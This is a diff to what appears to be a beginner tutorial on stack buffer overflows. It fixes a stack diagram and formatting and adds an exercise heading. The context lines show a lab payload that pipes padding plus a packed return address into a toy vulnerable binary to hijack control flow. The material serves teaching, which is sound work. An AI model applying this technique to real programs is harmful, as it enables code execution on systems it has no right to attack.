@@ -45,7 +45,7 @@ like during the function call.
                        |         |2 | ^       |
                        |         |1 | |       |
                        |      ch |0 | |       |
-                       +------------+-+-------+                       |                      |
+                       +------------+-+-------+                       
                        |                      |
                        |     unused space     |
                        +                      +
@@ -145,7 +145,7 @@ Exploiting actual programs:
 ---
 
 #### 1. Lets consider this code.
-```
+```c
 #include <stdio.h>
 
 void bar()
@@ -220,8 +220,8 @@ We know that one of them is nothing but buffer that scanf inputs.
 This must be the buffer that need to inject. base16(12) == base10(18). Our buffer is 18 bytes from `$ebp`.  
 
 Finally we are ready to craft the payload.  
-``echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ``
-The exact payload looks like:  
+``echo -e `python -c 'print "A"*18+<Dummay valur for EBP>+<Return address>'` | ./first ``  
+The exact payload looks like:    
 ``echo -e `python -c 'import struct;print "A"*18+"BBBB"+struct.pack("<I", 0x0804848b )'` | ./first ``
 
 ```
@@ -232,5 +232,6 @@ Segmentation fault (core dumped)
 
 :smile: we exploited the buffer overflow.  
 
+#### Try to solve exploit_me_2.c :smile:
 
 
